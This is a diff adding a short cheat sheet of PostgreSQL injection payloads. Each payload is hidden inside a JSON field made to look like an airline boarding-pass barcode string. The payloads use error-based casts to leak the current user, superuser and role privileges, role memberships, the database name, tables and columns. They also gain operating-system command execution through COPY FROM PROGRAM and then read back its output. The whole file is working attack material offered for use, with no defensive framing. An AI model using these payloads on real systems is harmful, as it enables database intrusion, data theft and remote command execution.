@@ -1,0 +1,20 @@
+- PostgreSQL Injection:
+
+# Check current user:
+{"raw": "M1ZED/RYUKI           EABC1234JFKSFOUS 0123 300Y001A0001 114>80B   6299BUS 03123'||CAST((SELECT concat_ws(chr(124),current_user,current_setting($$is_superuser$$),rolsuper,rolcreatedb,rolcreaterole,rolcanlogin,rolreplication,rolbypassrls) FROM pg_roles WHERE rolname=current_user) AS int)||'"}
+
+# Check role/memberships of user:
+{"raw": "M1ZED/RYUKI           EABC1234JFKSFOUS 0123 300Y001A0001 114>80B   6299BUS 03123'||CAST((SELECT string_agg(rolname,chr(44)) FROM pg_roles WHERE pg_has_role(current_user,oid,$$USAGE$$)) AS int)||'"}
+
+# Current Database Check:
+{"raw": "M1ZED/RYUKI           EABC1234JFKSFOUS 0123 300Y001A0001 114>80B   6299BUS 03123'||CAST((SELECT current_database()) AS int)||'"}
+
+# List all table:
+{"raw": "M1ZED/RYUKI           EABC1234JFKSFOUS 0123 300Y001A0001 114>80B   6299BUS 03123'||CAST((SELECT string_agg(table_name,$$,$$) FROM information_schema.tables) AS int)||'"}
+
+# List column of table:
+{"raw": "M1ZED/RYUKI           EABC1234JFKSFOUS 0123 300Y001A0001 114>80B   6299BUS 03123'||CAST((SELECT string_agg(column_name,chr(44)) FROM information_schema.columns WHERE table_name=$$<Table_name>$$) AS int)||''"}
+
+# Command execution:
+{"raw": "M1ZED/RYUKI           EABC1234JFKSFOUS 0123 300Y001A0001 114>80B   6299BUS 03123x'); DROP TABLE IF EXISTS cmd_exec_out; CREATE TABLE cmd_exec_out(line text); COPY cmd_exec_out FROM PROGRAM $$<Command_here>$$; --"}
+{"raw": "M1ZED/RYUKI           EABC1234JFKSFOUS 0123 300Y001A0001 114>80B   6299BUS 03123'||CAST((SELECT string_agg(line,chr(10)) FROM cmd_exec_out) AS int)||'"}
